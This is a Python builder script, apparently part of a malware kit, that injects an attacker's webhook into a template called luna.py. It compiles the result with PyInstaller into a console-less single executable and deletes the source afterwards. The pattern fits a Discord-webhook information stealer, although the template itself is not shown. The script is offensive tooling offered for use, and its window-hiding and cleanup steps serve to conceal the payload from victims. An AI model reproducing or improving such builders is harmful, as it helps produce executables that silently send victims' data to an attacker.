import os
import random
import shutil
import subprocess
import time
from json import dump, load, loads
from urllib.request import urlopen

from alive_progress import alive_bar
from colorama import Fore, Style, init

class Builder:
    def __init__(self) -> None:
        self.loading()
        
        if not self.check():
            exit()
            
        self.webhook = input(f'{Fore.MAGENTA}[+]{Fore.RESET} Enter your webhook: ')
        self.filename = input(f'{Fore.MAGENTA}[+]{Fore.RESET} Enter your filename: ')
        
        self.mk_file(self.filename, self.webhook)
        
        print(f'{Fore.MAGENTA}[+]{Fore.RESET} Built!')
        
        run = input(f'\n\n\n{Fore.MAGENTA}[+]{Fore.RESET} Do you want to test run the file? [y/n]: ')
        if run.lower() == 'y':
            self.run(self.filename)
        else:
            pass
        
        input(f'{Fore.MAGENTA}[+]{Fore.RESET} Press enter to exit...')
        
    def loading(self):
        p = Fore.MAGENTA + Style.DIM
        r = Fore.RED + Style.BRIGHT

        img = fr"""{p}   
                                                                ...                                                                    ...                                                                
                                                              ,(#(*.                                                                 ,/%#/.                                                             
                                                            ./#%%%(,                                                                 /#%%%(*                                                            
                                                           ./#%%%%%/,                                                              .*#%%%%%(,                                                           
                                                           *#%%%%%&%(,.             ..,,,*****/////////////****,,,...             ,/%%%%%%%#/.                                                          
                                                           *(%%%%%%%%%(*.  .,*/(#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#(*,..  ,/#%%%%%%%%#/.                                                          
                                                           ,/%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#%%%%%%%%%%%(*.                                                          
                                                           .*#%%%%%%%%%%&%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%/,.                                                          
                                                        .*#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%/.                                                        
                                                       ,(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*.                                                      
                                                     .*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%&%%%%%%(.                                                     
                                                    .(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*.                                                   
                                                   *#%%&%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(.                                                  
                                                 .(#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(*                                                 
                                                ,/%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(*.                                               
                                               ./%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*.                                              
                                              ,(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*                                              
                                             ,(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*.                                            
                                            .(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#,                                            
                                           ,/#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(*                                           
                                           *%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(                                           
                                          *(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*.                                         
                                         .(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#,                                         
                                        .,#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}#####{p}%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}######{p}%%%%%%%%%%%%%%%%%%%%%%%%%/.                                        
                                        ,/#%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}###########{p}%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}###########{p}%%%%%%%%%%%%%%%%%%%%%%%%%(,                                        
                                        *#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}################{p}%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}##################{p}%%%%%%%%%%%%%%%%%%%%%%%%%#/                                        
                                        *%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}#####################{p}%%%%%%%%%%%%%%%%%%%{r}######################{p}%%%%%%%%%%%%%%%%%%%%%%%%%%(.                                       
                                       ./%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}###################{p}%%%%%%%%%%%%%%%%%%%%%{r}####################{p}%%%%%%%%%%%%%%%%%%%%%%%%%%%#.                                       
                                       ,/%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}#################{p}%%%%%%%%%%%%%%%%%%%%%%%{r}##################{p}%%%%%%%%%%%%%%%%%%%%%%%%%%%%#,.                                      
                                       ,(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}#############{p}%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}############{p}%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*.                                      
                                       ,(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*.                                      
                                       ,(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*.                                      
                                       ,(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*.                                      
                                       ,(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%&%%%%%%%%%%%%%%%%%%%%%%%#,.                                      
                                       ./%%%%%%%%%%%%%%%%%%%%%%%%%%%%###%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%###%%%%%%%%%%%%%%%%%%%%%%%%%%%#,.                                      
                                        *#%%%%%%%%%%%%%%%%%%%%%%%%%(*....,*(#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#(/,....,/#%%%%%%%%%%%%%%%%%%%%%%%%#/.                                       
                                          .*/#%%%%%%%%%%%%%%%%%%%%%%%%#(*,.   .,,*//((###%%%%%%%%%%%%%%%%%%%%%%%##((//*,,.   .,*/(#%%%%%%%%%%%%%%%%%%%%%%%#(/,.                                         
                                              .*(%%%%%%%%%%%%%%%%%%%%%%%%%%%(.              ...,,,,***,,,...              .*#%%%%%%%%%%%%%%%%%%%%%%%%%%#/,                                              
                                                  .,/(#%%%%%%%%%%%%%%%%%%%%/,                                              ./#%%%%%%%%%%%%%%%%%%%%#/*,.                                                 
                                                       .*/(#%%%%%%%%%%%%%#/.                                                 *(%%%%%%%%%%%%%##(*,.                                                      
                                                            ..*/(#%%%%%%(,                                                    ./#&%%%%%#(*,..                                                           
                                                                  .,***,                                                        ,*/*,..
                                        
                                                                  
                      IP: {load(urlopen('https://jsonip.com/'))['ip']}
                Username: {os.getlogin()} 
                 PC Name: {os.getenv('COMPUTERNAME')}
        Operating System: {os.getenv('OS')}
        
        
|"""

        num = random.randint(30,40)
        with alive_bar(num) as bar:
            for banner in range(num):
                print(img)
                time.sleep(random.randint(1,3)/num)
                os.system('cls')
                
                bar()
                
            os.system('cls')
        
        print(Style.RESET_ALL)
    
    def check(self):
        required_files = {'./luna.py',
                    './requirements.txt',}
        
        for file in required_files:
            if not os.path.isfile(file):
                print(f'{Fore.RED}[!]{Fore.RESET} {file} not found!')
                return False

        try: 
            print(subprocess.check_output("python -V", stderr=subprocess.STDOUT))
            print(subprocess.check_output("pip -V", stderr=subprocess.STDOUT))
            
        except subprocess.CalledProcessError: 
            print(f'{Fore.RED}[!]{Fore.RESET} Python not found!')
            return False
        
        os.system('pip install --upgrade -r requirements.txt')

        os.system('cls')
        
        os.system('mode con:cols=150 lines=20')
        
        return True
    
    def mk_file(self, filename, webhook):
        print(f'{Fore.MAGENTA}[+]{Fore.RESET} Generating source code...')
        
        with open('./luna.py', 'r') as f:
            code = f.read()
            
        with open(f"{filename}.py", 'w') as f:
            f.write(code.replace('&webhook_here&', webhook))
        
        self.compile(filename)
            
    def compile(self, filename):
        print(f'{Fore.MAGENTA}[+]{Fore.RESET} Compiling code...')
        
        os.system(f'python -m PyInstaller --onefile --noconsole -i NONE --distpath ./ .\{filename}.py')

        cleans_dir = {'./__pycache__', './build'}
        cleans_file = {f'./{filename}.spec', f'./{filename}.py'}
        
        for clean in cleans_dir:
            try:
                if os.path.isdir(clean):
                    shutil.rmtree(clean)
                    print(f'{Fore.MAGENTA}[+]{Fore.RESET} {clean} removed!')
            except:
                print(f'{Fore.RED}[!]{Fore.RESET} {clean} not found!')
                continue
        
        for clean in cleans_file:
            try:
                if os.path.isfile(clean):
                    os.remove(clean)
                    print(f'{Fore.MAGENTA}[+]{Fore.RESET} {clean} removed!')
            except:
                print(f'{Fore.RED}[!]{Fore.RESET} {clean} not found!')
                continue
    
    def run(self, filename):
        print(f'{Fore.MAGENTA}[+]{Fore.RESET} Attempting to execute file...')
        
        if os.path.isfile(f'./{filename}.exe'):
            os.system(f'start ./{filename}.exe')
        
if __name__ == '__main__':
    init()
    
    if not os.name == "nt":
        os.system("clear")
    else:
        os.system('mode con:cols=212 lines=212')
        os.system("cls")
    
    Builder()
